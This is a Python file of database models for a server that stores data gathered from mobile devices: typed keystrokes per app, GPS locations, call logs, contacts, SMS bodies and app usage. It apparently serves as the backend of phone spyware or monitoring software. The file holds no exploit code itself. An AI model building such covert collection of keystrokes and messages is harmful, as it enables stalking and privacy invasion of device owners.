from datetime import datetime
from config.database import db
import ast

class Device(db.Model):
    __tablename__ = 'devices'

    device_id = db.Column(db.String(255), primary_key=True)
    device_ip = db.Column(db.String(255), nullable=False)
    last_seen = db.Column(db.DateTime, default=datetime.now)

    # Relationships
    device_info = db.relationship('DeviceInfo', backref='device', lazy=True)
    keystrokes = db.relationship('Keystroke', backref='device', lazy=True)
    locations = db.relationship('DeviceLocation', backref='device', lazy=True)
    apps = db.relationship('AppInfo', backref='device', lazy=True)
    call_logs = db.relationship('CallLog', backref='device', lazy=True)
    contacts = db.relationship('Contact', backref='device', lazy=True)
    sms_messages = db.relationship('SMSMessage', backref='device', lazy=True)

    def to_dict(self):
        return {
            'device_id': self.device_id,
            'device_ip': self.device_ip,
            'last_seen': self.last_seen.isoformat() if self.last_seen else None
        }

class DeviceInfo(db.Model):
    __tablename__ = 'device_info'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
    info_type = db.Column(db.String(50), nullable=False)  # device_info, battery_info, sim_info, os_info
    data = db.Column(db.Text, nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        try:
            parsed_data = ast.literal_eval(self.data)
        except Exception:
            parsed_data = {}
        return {
            'id': self.id,
            'device_id': self.device_id,
            'info_type': self.info_type,
            'timestamp': self.timestamp,
            ** parsed_data
        }

class Keystroke(db.Model):
    __tablename__ = 'keystrokes'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
    package_name = db.Column(db.String(255))
    text = db.Column(db.Text)
    event_type = db.Column(db.String(50))  # TEXT_CHANGE, CLICK, DOUBLE_CLICK, LONG_CLICK, SELECTED
    timestamp = db.Column(db.DateTime, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'package_name': self.package_name,
            'text': self.text,
            'event_type': self.event_type,
            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
            'created_at': self.created_at.isoformat()
        }

class DeviceLocation(db.Model):
    __tablename__ = 'device_locations'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
    latitude = db.Column(db.Float, nullable=False)
    longitude = db.Column(db.Float, nullable=False)
    accuracy = db.Column(db.Float)
    timestamp = db.Column(db.DateTime, nullable=False)
    provider = db.Column(db.String(50))
    created_at = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'latitude': self.latitude,
            'longitude': self.longitude,
            'accuracy': self.accuracy,
            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
            'provider': self.provider,
            'created_at': self.created_at.isoformat()
        }

class AppInfo(db.Model):
    __tablename__ = 'apps_info'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
    package_name = db.Column(db.String(255), nullable=False)
    app_name = db.Column(db.String(255))
    app_version = db.Column(db.String(255))
    is_system_app = db.Column(db.Boolean, default=False)
    is_enabled = db.Column(db.Boolean, default=True)
    install_time = db.Column(db.DateTime)
    last_used_time = db.Column(db.DateTime)
    total_time_in_foreground = db.Column(db.Integer)  # Total time in foreground in milliseconds
    created_at = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'package_name': self.package_name,
            'app_name': self.app_name,
            'app_version': self.app_version,
            'is_system_app': self.is_system_app,
            'is_enabled': self.is_enabled,
            'install_time': self.install_time.isoformat() if self.install_time else None,
            'last_used_time': self.last_used_time.isoformat() if self.last_used_time else None,
            'total_time_in_foreground': self.total_time_in_foreground,
            'created_at': self.created_at.isoformat()
        }

class CallLog(db.Model):
    __tablename__ = 'call_logs'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
    phone_number = db.Column(db.String(50), nullable=False)
    contact_name = db.Column(db.String(255))
    call_type = db.Column(db.String(20))  # INCOMING, OUTGOING, MISSED
    duration = db.Column(db.Integer)  # Duration in seconds
    timestamp = db.Column(db.DateTime, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'phone_number': self.phone_number,
            'contact_name': self.contact_name,
            'call_type': self.call_type,
            'duration': self.duration,
            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
            'created_at': self.created_at.isoformat()
        }

class Contact(db.Model):
    __tablename__ = 'contacts'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
    name = db.Column(db.String(255), nullable=False)
    phone_numbers = db.Column(db.Text)  # Stored as JSON string
    last_updated = db.Column(db.DateTime, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'name': self.name,
            'phone_numbers': self.phone_numbers,
            'last_updated': self.last_updated.isoformat() if self.last_updated else None,
            'created_at': self.created_at.isoformat()
        }

class SMSMessage(db.Model):
    __tablename__ = 'sms_messages'

    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), db.ForeignKey('devices.device_id'), nullable=False)
    phone_number = db.Column(db.String(50), nullable=False)
    contact_name = db.Column(db.String(255))
    message_type = db.Column(db.String(20))  # INBOX, SENT, DRAFT, OUTBOX
    message_body = db.Column(db.Text)
    timestamp = db.Column(db.DateTime, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.now)

    def to_dict(self):
        return {
            'id': self.id,
            'device_id': self.device_id,
            'phone_number': self.phone_number,
            'contact_name': self.contact_name,
            'message_type': self.message_type,
            'message_body': self.message_body,
            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
            'created_at': self.created_at.isoformat()
        } 